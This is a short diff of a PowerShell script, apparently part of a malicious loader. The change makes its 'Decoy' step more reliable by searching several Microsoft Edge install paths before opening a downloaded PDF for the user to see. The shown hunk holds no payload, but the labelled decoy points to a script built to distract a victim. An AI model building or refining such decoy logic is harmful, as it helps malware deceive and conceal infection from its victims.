@@ -46,8 +46,17 @@ if ($pdfUrl) {
 }
 
 # === 3. Open PDF in Edge Browser (Decoy) ===
-$edgePath = "C:\Windows\System32\msedge.exe"
-if ((Test-Path $edgePath) -and (Test-Path $pdfPath)) {
+$edgePaths = @(
+    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+    "C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+    "C:\Windows\System32\msedge.exe"
+)
+$edgePath = $null
+foreach ($ep in $edgePaths) {
+    if (Test-Path $ep) { $edgePath = $ep; break }
+}
+
+if ($edgePath -and (Test-Path $pdfPath)) {
     Start-Process $edgePath -ArgumentList "--new-window `"$pdfPath`""
 } elseif (Test-Path $pdfPath) {
     Start-Process $pdfPath
